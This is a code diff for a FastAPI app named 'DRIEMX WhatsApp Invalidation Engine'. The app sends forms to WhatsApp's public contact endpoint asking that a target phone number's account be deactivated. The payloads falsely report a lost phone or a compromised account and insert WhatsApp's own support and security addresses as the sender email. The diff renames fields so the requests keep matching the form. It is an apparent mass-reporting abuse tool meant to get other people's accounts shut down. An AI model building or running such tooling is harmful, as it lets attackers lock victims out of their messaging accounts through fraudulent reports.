@@ -3,7 +3,7 @@ from fastapi.middleware.cors import CORSMiddleware
 import httpx
 import asyncio
 
-app = FastAPI(title="DRIEMX WhatsApp Invalidation Engine", version="5.1")
+app = FastAPI(title="DRIEMX WhatsApp Invalidation Engine", version="5.2")
 
 app.add_middleware(
     CORSMiddleware,
@@ -19,13 +19,13 @@ SUPPORT_ENDPOINTS = [
         "url": "https://www.whatsapp.com/contact/noclient/",
         "method": "POST",
         "payload_func": lambda phone: {
-            "imei": "",
+            "j": "",
             "lg": "es",
             "email": "support@support.whatsapp.com",
             "confirm_email": "support@support.whatsapp.com",
             "platform": "ANDROID",
             "phone_number": phone,
-            "message": f"Perdida de telefono, desactivar cuenta {phone}"
+            "body": f"Perdida de telefono, desactivar cuenta {phone}"
         }
     },
     {
@@ -33,12 +33,13 @@ SUPPORT_ENDPOINTS = [
         "url": "https://www.whatsapp.com/contact/noclient/",
         "method": "POST",
         "payload_func": lambda phone: {
+            "j": "",
             "lg": "es",
             "email": "security@whatsapp.com",
             "confirm_email": "security@whatsapp.com",
             "platform": "ANDROID",
             "phone_number": phone,
-            "message": f"Cuenta comprometida, cierre de sesion requerido para {phone}"
+            "body": f"Cuenta comprometida, cierre de sesion requerido para {phone}"
         }
     }
 ]
